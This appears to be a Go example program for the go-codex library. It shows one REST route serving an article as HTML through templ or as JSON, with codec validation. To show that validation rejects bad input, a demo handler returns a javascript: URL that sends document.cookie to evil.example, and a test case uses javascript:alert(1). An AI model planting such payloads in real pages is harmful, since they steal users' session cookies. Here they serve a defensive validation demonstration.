// Package main demonstrates how go-codex fits into a templ-based rendering
// pipeline using the adapters/templ format plug-in.
//
// The same rest.Route and handler function serve two formats:
//   - Accept: text/html        → templ component rendered as HTML
//   - Accept: application/json → JSON response
//
// Content negotiation is handled automatically by the existing nethttp adapter.
// The templ component receives validated ArticleProps; invalid props return
// HTTP 500 before the template is reached.
//
// Components are implemented with templ.ComponentFunc — no code generation
// required to run this example.
//
// Run with: go run ./examples/adapters-templ
package main

import (
	"context"
	"fmt"
	"html"
	"io"
	"log/slog"
	"net"
	"net/http"
	"os"
	"strings"
	"sync"
	"time"

	atempl "github.com/a-h/templ"

	nethttp "github.com/DaniDeer/go-codex/adapters/nethttp"
	adapttempl "github.com/DaniDeer/go-codex/adapters/templ"
	"github.com/DaniDeer/go-codex/api/rest"
	"github.com/DaniDeer/go-codex/codex"
	"github.com/DaniDeer/go-codex/format"
	"github.com/DaniDeer/go-codex/middleware"
	"github.com/DaniDeer/go-codex/stats"
	"github.com/DaniDeer/go-codex/validate"
)

// ── Domain types ──────────────────────────────────────────────────────────────

// ArticleProps is the validated data passed to the templ component.
// All fields carry Refine constraints — the codec rejects invalid data before
// the component ever renders.
type ArticleProps struct {
	ID          string
	Title       string
	Slug        string
	AuthorLine  string // formatted for display: "by <name>"
	Date        string // ISO 8601 date
	ReadMoreURL string
	Summary     string
}

// ── Codecs ────────────────────────────────────────────────────────────────────

// ArticlePropsCodec validates the props passed to the templ component.
// The same constraints apply to both JSON encoding and HTML rendering (symmetric
// Refine): the codec rejects invalid data in both directions.
var ArticlePropsCodec = codex.Struct[ArticleProps](
	codex.RequiredField("id", codex.String().Refine(validate.UUID).WithTitle("ID"), func(a ArticleProps) string { return a.ID }, func(a *ArticleProps, v string) { a.ID = v }),
	codex.RequiredField("title", codex.String().Refine(validate.NonEmptyString).WithTitle("Title"), func(a ArticleProps) string { return a.Title }, func(a *ArticleProps, v string) { a.Title = v }),
	codex.RequiredField("slug", codex.String().Refine(validate.Slug).WithTitle("Slug"), func(a ArticleProps) string { return a.Slug }, func(a *ArticleProps, v string) { a.Slug = v }),
	codex.RequiredField("authorLine", codex.String().Refine(validate.NonEmptyString).WithTitle("Author"), func(a ArticleProps) string { return a.AuthorLine }, func(a *ArticleProps, v string) { a.AuthorLine = v }),
	codex.RequiredField("date", codex.String().Refine(validate.Date).WithTitle("Published At"), func(a ArticleProps) string { return a.Date }, func(a *ArticleProps, v string) { a.Date = v }),
	codex.RequiredField("readMoreURL", codex.String().Refine(validate.URL).WithTitle("URL"), func(a ArticleProps) string { return a.ReadMoreURL }, func(a *ArticleProps, v string) { a.ReadMoreURL = v }),
	codex.OptionalField("summary", codex.String().WithTitle("Summary"), func(a ArticleProps) string { return a.Summary }, func(a *ArticleProps, v string) { a.Summary = v }),
)

// ── templ component (implemented with ComponentFunc — no codegen required) ───

// articleCard renders a validated ArticleProps as an HTML article element.
func articleCard(p ArticleProps) atempl.Component {
	return atempl.ComponentFunc(func(_ context.Context, w io.Writer) error {
		_, err := fmt.Fprintf(w,
			`<article>`+
				`<h2><a href="%s">%s</a></h2>`+
				`<p class="meta">%s &mdash; %s</p>`+
				`<p>%s</p>`+
				`</article>`,
			html.EscapeString(p.ReadMoreURL),
			html.EscapeString(p.Title),
			html.EscapeString(p.AuthorLine),
			html.EscapeString(p.Date),
			html.EscapeString(p.Summary),
		)
		return err
	})
}

// ── Observer ──────────────────────────────────────────────────────────────────

type CountingObserver struct {
	mu             sync.Mutex
	total          int
	byStatus       map[int]int
	valErrorsByLoc map[string]int
	latencies      []time.Duration
}

func (o *CountingObserver) RecordRequest(_ string, _ string, statusCode int, d time.Duration) {
	o.mu.Lock()
	defer o.mu.Unlock()
	o.total++
	if o.byStatus == nil {
		o.byStatus = make(map[int]int)
	}
	o.byStatus[statusCode]++
	o.latencies = append(o.latencies, d)
}

func (o *CountingObserver) RecordSubscribe(_ string, _ bool, _ time.Duration) {}
func (o *CountingObserver) RecordPublish(_ string, _ bool, _ time.Duration)   {}

func (o *CountingObserver) RecordValidationError(location, constraintName, field string) {
	o.mu.Lock()
	defer o.mu.Unlock()
	if o.valErrorsByLoc == nil {
		o.valErrorsByLoc = make(map[string]int)
	}
	o.valErrorsByLoc[location]++
}

func (o *CountingObserver) Print() {
	o.mu.Lock()
	defer o.mu.Unlock()
	fmt.Printf("  total requests: %d\n", o.total)
	for code, n := range o.byStatus {
		fmt.Printf("  HTTP %-3d       : %d\n", code, n)
	}
	for loc, n := range o.valErrorsByLoc {
		fmt.Printf("  val errs (%s): %d\n", loc, n)
	}
}

// ── Main ──────────────────────────────────────────────────────────────────────

// mustServe exits the program if Register or Serve returns an error.
func mustServe(err error, what string) {
	if err != nil {
		fmt.Fprintf(os.Stderr, "%s failed: %v\n", what, err)
		os.Exit(1)
	}
}

// mustFreeAddr reserves an OS-assigned free TCP port on localhost, then
// releases it immediately so AttachMux's own *http.Server can bind to it.
func mustFreeAddr() string {
	l, err := net.Listen("tcp", "127.0.0.1:0")
	if err != nil {
		fmt.Fprintf(os.Stderr, "reserve free port failed: %v\n", err)
		os.Exit(1)
	}
	addr := l.Addr().String()
	_ = l.Close()
	return addr
}

// waitForReady polls addr until it accepts TCP connections — b.Serve wires
// mux synchronously before starting its listener goroutine, so demo
// requests below must wait for it to actually be listening first.
func waitForReady(addr string) {
	for range 100 {
		conn, err := net.DialTimeout("tcp", addr, 50*time.Millisecond)
		if err == nil {
			_ = conn.Close()
			return
		}
		time.Sleep(10 * time.Millisecond)
	}
}

func main() {
	// ── Route definition ─────────────────────────────────────────────────────
	//
	// rest.Formats declares both formats inline on the route. The same route
	// serves two representations:
	//   Accept: text/html        → articleCard component rendered as HTML
	//   Accept: application/json → JSON-encoded ArticleProps
	//
	// No separate route, no separate handler — one definition, two formats.

	b := rest.NewServer(rest.Info{Title: "Article API", Version: "1.0.0"})
	articleRoute := rest.NewRoute[struct{}, ArticleProps]("GET", "/article",
		codex.Empty, ArticlePropsCodec,
		rest.RouteMeta{OperationID: "getArticle"},
		rest.Formats(
			adapttempl.Format(ArticlePropsCodec, articleCard), // Accept: text/html
			format.JSON(ArticlePropsCodec),                    // Accept: application/json
		),
	)

	// ── Handler ──────────────────────────────────────────────────────────────
	//
	// The handler returns ArticleProps. The adapter picks the right format based
	// on the Accept header. Props are validated before any format renders them.

	logger := slog.New(slog.NewTextHandler(os.Stdout, &slog.HandlerOptions{Level: slog.LevelDebug}))
	slog.SetDefault(logger)

	metrics := &CountingObserver{}
	obs := stats.NewFanout(metrics, stats.NewLoggingObserver(logger.With("component", "templ")))
	handler := func(_ context.Context, _ struct{}) (ArticleProps, error) {
		return ArticleProps{
			ID:          "550e8400-e29b-41d4-a716-446655440000",
			Title:       "Introduction to go-codex",
			Slug:        "intro-go-codex",
			AuthorLine:  "by Alice",
			Date:        "2024-06-01",
			ReadMoreURL: "https://example.com/intro-go-codex",
			Summary:     "A short guide to self-documenting codecs in Go.",
		}, nil
	}

	obsMw := middleware.ServerImplementation{Name: "observability", Fn: nethttp.Observability(obs)}
	articleRoute = articleRoute.WithHandler(handler).HandleMW(nil, obsMw.Fn).WithOptions(nethttp.Options{})
	mustServe(articleRoute.Register(b), "register /article")

	mux := http.NewServeMux()
	addr := mustFreeAddr()
	mustServe(nethttp.AttachMux(b, mux, addr), "AttachMux")
	ctx, cancel := context.WithCancel(context.Background())
	go func() { _ = b.Serve(ctx) }()
	defer cancel()
	waitForReady(addr)
	srvURL := "http://" + addr

	// ── Request 1: HTML response ──────────────────────────────────────────────
	fmt.Println("=== GET /article (Accept: text/html) ===")
	resp1, _ := get(srvURL+"/article", "text/html")
	fmt.Printf("  Content-Type: %s\n", resp1.Header.Get("Content-Type"))
	body1, _ := io.ReadAll(resp1.Body)
	_ = resp1.Body.Close()
	fmt.Printf("  Status: %d\n", resp1.StatusCode)
	fmt.Printf("  Body: %s\n\n", strings.TrimSpace(string(body1)))

	// ── Request 2: JSON response ──────────────────────────────────────────────
	fmt.Println("=== GET /article (Accept: application/json) ===")
	resp2, _ := get(srvURL+"/article", "application/json")
	fmt.Printf("  Content-Type: %s\n", resp2.Header.Get("Content-Type"))
	body2, _ := io.ReadAll(resp2.Body)
	_ = resp2.Body.Close()
	fmt.Printf("  Status: %d\n", resp2.StatusCode)
	fmt.Printf("  Body: %s\n\n", strings.TrimSpace(string(body2)))

	// ── Request 3: invalid props → 500, template never reached ───────────────
	//
	// This handler violates the codec contract: it returns props with an invalid
	// URL scheme and an empty title. The templ format validates props via the
	// codec's Refine constraints (symmetric validation) and returns 500 — the
	// articleCard component is never rendered with invalid data.

	invalidB := rest.NewServer(rest.Info{Title: "Article API (invalid demo)", Version: "1.0.0"})
	invalidArticleRoute := rest.NewRoute[struct{}, ArticleProps]("GET", "/article",
		codex.Empty, ArticlePropsCodec,
		rest.RouteMeta{OperationID: "getArticle"},
		rest.Formats(
			adapttempl.Format(ArticlePropsCodec, articleCard),
			format.JSON(ArticlePropsCodec),
		),
	).WithHandler(func(_ context.Context, _ struct{}) (ArticleProps, error) {
		return ArticleProps{
			ID:          "not-a-uuid",   // fails UUID
			Title:       "",             // fails NonEmptyString
			Slug:        "INVALID SLUG", // fails Slug
			AuthorLine:  "by Eve",
			Date:        "32/13/9999",                                                        // fails Date
			ReadMoreURL: "javascript:fetch('https://evil.example/steal?c='+document.cookie)", // fails URL scheme
		}, nil
	}).HandleMW(nil, obsMw.Fn).WithOptions(nethttp.Options{})
	mustServe(invalidArticleRoute.Register(invalidB), "register invalid /article")

	invalidMux := http.NewServeMux()
	invalidAddr := mustFreeAddr()
	mustServe(nethttp.AttachMux(invalidB, invalidMux, invalidAddr), "AttachMux invalid")
	invalidCtx, invalidCancel := context.WithCancel(context.Background())
	go func() { _ = invalidB.Serve(invalidCtx) }()
	defer invalidCancel()
	waitForReady(invalidAddr)
	invalidSrvURL := "http://" + invalidAddr

	fmt.Println("=== GET /article with invalid props (Accept: text/html) ===")
	resp3, _ := get(invalidSrvURL+"/article", "text/html")
	body3, _ := io.ReadAll(resp3.Body)
	_ = resp3.Body.Close()
	fmt.Printf("  Status: %d (props failed validation — template never reached)\n\n", resp3.StatusCode)
	_ = body3

	// ── What the codec prevents (codec-direct showcase) ───────────────────────
	fmt.Println("=== What the codec prevents — invalid raw payloads ===")
	badCases := []struct {
		label string
		input map[string]any
	}{
		{"url is javascript:", map[string]any{"id": "550e8400-e29b-41d4-a716-446655440000", "title": "T", "slug": "t", "authorLine": "by A", "date": "2024-01-01", "readMoreURL": "javascript:alert(1)", "summary": ""}},
		{"title empty", map[string]any{"id": "550e8400-e29b-41d4-a716-446655440000", "title": "", "slug": "t", "authorLine": "by A", "date": "2024-01-01", "readMoreURL": "https://x.com", "summary": ""}},
		{"slug uppercase", map[string]any{"id": "550e8400-e29b-41d4-a716-446655440000", "title": "T", "slug": "HAS_CAPS", "authorLine": "by A", "date": "2024-01-01", "readMoreURL": "https://x.com", "summary": ""}},
		{"date wrong fmt", map[string]any{"id": "550e8400-e29b-41d4-a716-446655440000", "title": "T", "slug": "t", "authorLine": "by A", "date": "01/06/2024", "readMoreURL": "https://x.com", "summary": ""}},
		{"id not UUID", map[string]any{"id": "not-a-uuid", "title": "T", "slug": "t", "authorLine": "by A", "date": "2024-01-01", "readMoreURL": "https://x.com", "summary": ""}},
	}
	for _, bc := range badCases {
		_, decErr := ArticlePropsCodec.Decode(bc.input)
		fmt.Printf("  %-20s → %v\n", bc.label+":", decErr)
	}

	fmt.Println("\n=== Observer summary ===")
	metrics.Print()
}

func get(url, accept string) (*http.Response, error) {
	req, _ := http.NewRequest(http.MethodGet, url, nil) //nolint:noctx
	if accept != "" {
		req.Header.Set("Accept", accept)
	}
	return http.DefaultClient.Do(req) //nolint:noctx
}
